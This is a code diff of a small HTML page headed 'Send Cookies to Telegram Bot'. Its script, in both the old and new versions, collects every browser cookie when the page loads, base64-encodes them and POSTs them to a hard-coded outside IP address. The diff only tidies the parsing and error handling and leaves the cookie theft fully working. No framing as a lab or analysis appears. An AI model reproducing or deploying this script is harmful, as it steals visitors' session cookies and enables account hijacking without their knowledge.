@@ -6,54 +6,37 @@
     <title>Send Cookies</title>
     <script>
         function getCookies() {
-            if (!document.cookie) return {};
-
             const cookiePairs = document.cookie.split('; ');
             const cookies = {};
 
             cookiePairs.forEach(pair => {
-                const index = pair.indexOf('=');
-                
-                if (index === -1) {
-                    cookies[pair] = "";
-                } else {
-                    const name = pair.substring(0, index);
-                    const value = pair.substring(index + 1);
-                    cookies[name] = decodeURIComponent(value);
-                }
+                const [name, value] = pair.split('=');
+                cookies[name] = decodeURIComponent(value);
             });
 
             return cookies;
         }
 
-        function sendCookiesToServer() {
+        window.onload = function() {
             const cookies = getCookies();
-            if (!cookies) {
-                console.log("No cookies found");
-                return;
-            }
-
-            const encodedCookies = btoa(unescape(encodeURIComponent(JSON.stringify(cookies)))); // Base64 encode with proper Unicode handling
+            const encodedCookies = btoa(JSON.stringify(cookies));
             console.log("Cookies to be sent (encoded):", encodedCookies);
-            console.log("Sending cookies:", JSON.stringify({ cookies: encodedCookies }));
 
             fetch('https://144.172.76.108:8000/send-cookies', {
                 method: 'POST',
-                mode: 'no-cors',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({ cookies: encodedCookies })
             })
-            .catch(err => {
-                console.error("Error sending cookies:", err);
-            });
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(err => console.error("Error:", err));
         }
-
-        window.onload = sendCookiesToServer;
     </script>
 </head>
 <body>
     <h1>Send Cookies to Telegram Bot</h1>
 </body>
 </html>
+
